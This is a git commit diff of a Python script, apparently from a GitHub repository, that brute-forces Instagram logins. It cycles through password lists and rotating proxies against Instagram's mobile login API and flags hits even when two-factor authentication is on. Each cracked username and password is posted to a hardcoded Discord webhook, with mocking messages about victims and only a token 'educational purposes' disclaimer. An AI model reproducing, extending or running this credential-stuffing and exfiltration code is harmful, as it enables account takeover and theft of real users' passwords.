0a314451d83eab35e40f1ad7de02523501e10466
James <93611007+sjPsycho@users.noreply.github.com>
2022-09-17 23:09:51 -0400

    Update main.py

--- main.py
+++ main.py
@@ -1,34 +1,24 @@
-from concurrent.futures import thread
-import email
-import sys
+
 from threading import Thread
-import threading
-from tkinter import E
-from traceback import print_list
 import requests
 from bs4 import BeautifulSoup
 import uuid
 from colorama import Fore, init
-import time
-import json
 import os
-import random
-import string
+from art import *
+
+os.system('title $React ~ Made for educational purposes only. (Fuck Society)')
 
 def clear():
     os.system('cls')
-
 clear()
 
 proxy_list = []
-
 with open('data/proxy.txt') as q:
     proxy = q.readlines()
 
 o = 1
 for line in proxy:
-    e = 0
-
     prxy = line.split(':')
     proxy1 = prxy[0]
     port1 = prxy[1]
@@ -40,36 +30,27 @@ for line in proxy:
     proxy_list.append(Proxys)
     o += 1
 
-
-versionV = "14.1 beta"
-def webhook(attempts, target, userLogin, passLogin):
+def webhook(userBruted, passKey):
     paramsGet = {"wait":"true"}
-    rawBody = "{\"content\":\"@everyone\",\"embeds\":[{\"color\":0,\"fields\":[{\"name\":\"**Username claimed**\",\"value\":\"@/" + target + "\"},{\"name\":\"**Attempts**\",\"value\":\"" + str(attempts) +"\"},{\"name\":\"**Original freshie username**\",\"value\":\"@/||" + userLogin + "||\"},{\"name\":\"**Original freshie password**\",\"value\":\"||" + passLogin + "||\"}],\"author\":{\"name\":\"Ni Success\",\"icon_url\":\"https://repository-images.githubusercontent.com/249859975/6d137780-7ad0-11ea-8789-89475d08dfc6\"},\"footer\":{\"text\":\"Claimer v" + versionV +" | Production By SJ\",\"icon_url\":\"https://repository-images.githubusercontent.com/249859975/6d137780-7ad0-11ea-8789-89475d08dfc6\"}}],\"attachments\":[]}"
-    headers = {
-        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
-        "Content-Type":"application/json"
-    }
-    webhookRequest = requests.post("https://discord.com/api/webhooks/1010322759282343976/iCBet-S1hFbj7OY5n4LEmCz1_rLzKIMc4xhjtmyJzF0APO9927p9amWU5-E61rYNFO7a", data=rawBody, params=paramsGet, headers=headers)
+    rawBody = "{\"content\":null,\"embeds\":[{\"color\":16711680,\"fields\":[{\"name\":\"User Brute Forced\",\"value\":\"@" + userBruted + "\"},{\"name\":\"Password\",\"value\":\"" + passKey + "\"}],\"author\":{\"name\":\"Fuck Society\",\"url\":\"https://discord.dog/282008877753696268\",\"icon_url\":\"https://i.pinimg.com/originals/c6/d0/c1/c6d0c132b45434b4794cee4f2bbafa4a.png\"},\"footer\":{\"text\":\"sjPsycho\",\"icon_url\":\"https://cdn.discordapp.com/emojis/924055212321275934.webp?size=96&quality=lossless\"},\"timestamp\":\"2004-07-30T07:33:00.000Z\"}],\"username\":\"React\",\"avatar_url\":\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHPVXVdrlc6-ueOw9Sd4EnbDyz0r1MFkdhnQ&usqp=CAU\",\"attachments\":[]}"
+    headers = {"Origin":"https://discohook.org","Sec-Ch-Ua":"\"Chromium\";v=\"105\", \"Not)A;Brand\";v=\"8\"","Accept":"application/json","Sec-Ch-Ua-Platform":"\"Windows\"","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36","Referer":"https://discohook.org/","Sec-Fetch-Site":"cross-site","Sec-Fetch-Dest":"empty","Accept-Encoding":"gzip, deflate","Sec-Fetch-Mode":"cors","Accept-Language":"en","Sec-Ch-Ua-Mobile":"?0","Content-Type":"application/json"}
+    response = session.post("https://discord.com/api/v10/webhooks/1020878821584539699/gWa7KFsNri304FZVL8yO4aQ-mNWCXkL3I--PoPrSUIcqTUMFI99B5sEly3GdY55W2oBE", data=rawBody, params=paramsGet, headers=headers)
 
 with open ('data/users.txt') as p:
     targets_list = p.read().split('\n')
 
-k = 0
-
 def post(targ, passLogin, Proxy):
+    global attemptCounter, ifPasswCheckInt
     myUUID = str(uuid.uuid4())
-    x = 0
 
     proxies = {
         'https': Proxy
     }
 
-    global attemptCounter
-
     paramsPost = {
         "ig_sig_key_version": "5",
         "signed_body": "fa61f4be32e827c7152e38a075e36142d8313ba582d6437f07539b00a03f454e.{\"reg_login\":\"0\",\"password\":\"" + passLogin + "\",\"device_id\":\"" + myUUID + "\",\"username\":\"" + targ + "\",\"adid\":\"FE4FD084-9DCB-481A-A248-57E0E32E25ED\",\"login_attempt_count\":\"0\",\"phone_id\":\"" + myUUID + "\"}"
-        }
+    }
 
     headers = {
         "Accept": "*/*", "X-IG-Capabilities": "36r/Vw==",
@@ -77,40 +58,50 @@ def post(targ, passLogin, Proxy):
         "Connection": "close", "X-IG-ABR-Connection-Speed-KBPS": "0", "X-IG-Connection-Speed": "-1kbps",
         "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US;q=1", "X-IG-Connection-Type": "WiFi",
         "X-IG-App-ID": "124024574287414", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
-        }
-    # Login request
+    }
+
     try:
         response = session.post("https://i.instagram.com/api/v1/accounts/login/", data=paramsPost, headers=headers, proxies=proxies, timeout=5)
+        attemptCounter += 1
         lib = response.content.decode('utf-8')
 
         if("logged_in_user" in lib):
-            print("[" + Fore.GREEN + "+" + Fore.RESET + "] Bruted This MF's Shit!")
+            print("[" + Fore.GREEN + "+" + Fore.RESET + "] Bruted this fucking idiot. No 2FA Either lol.")
+            webhook(targ, passLogin)
+            ifPasswCheckInt += 1
+        elif("two_factor_required" in lib):
+            print("[" + Fore.YELLOW + "$" + Fore.RESET + "] 2FA On - Successfully Bruted!")
+            webhook(targ, passLogin)
+            ifPasswCheckInt += 1
         elif("The password you entered is incorrect." in lib):
             print(f'[!] Bruting: {targ}')
             print(f'[!] Password: {passLogin} == Incorrect!')
+            ifPasswCheckInt += 1
         else:
-            print('Error Logging In Account {@' + targ + '} == ' + str(response.status_code))
-            print('Reason == ' + str(response.text) + '\n' + 'Pass == ' + passLogin)
+            print(f'[Error] Log In @{targ} Failed || Response Code: {response.status_code}')
+            print(f'[Reason] {response.content} || Password attempt: {passLogin}')
+            ifPasswCheckInt += 1
     except Exception as e:
         print(e)
         pass
 
 with open('data/pass.txt') as f:
     passwords = f.read().split('\n')
-
 len = passwords.__len__()
-
-nWorkers = input('Number of threads: ')
 
 clear()
 
-print('Starting Bruter By SJ (SJ#0008)')
-print('No one ever wants to listen, fuck all of these fucking comedians.\n\n')
+print('Starting Bruter By sjPsycho || SJ#0008 || Computer Murderers.')
+tprint('ig-brute')
+print('\n')
 
-threads = []
+print('Press enter to continue...')
+input('')
+print('\n')
 
+#threads = []
+ifPasswCheckInt = 0
 attemptCounter = 0
-i = 0
 a = 0
 r = 0
 for passW in passwords:
@@ -123,13 +114,11 @@ for passW in passwords:
             os.system('title [SJ] R/s: ' + str(attemptCounter) + " // Account #" + str(a))
             a += 1
             r += 1
-            attemptCounter += 1
         except Exception as S:
             print(S)
             continue
-    i+=1
-    
 
+# Threading
 """for n in range(int(nWorkers)):
     t = threading.Thread(target=post, args=(user, passwords[i], proxy_list[r]))
     threads.append(t)
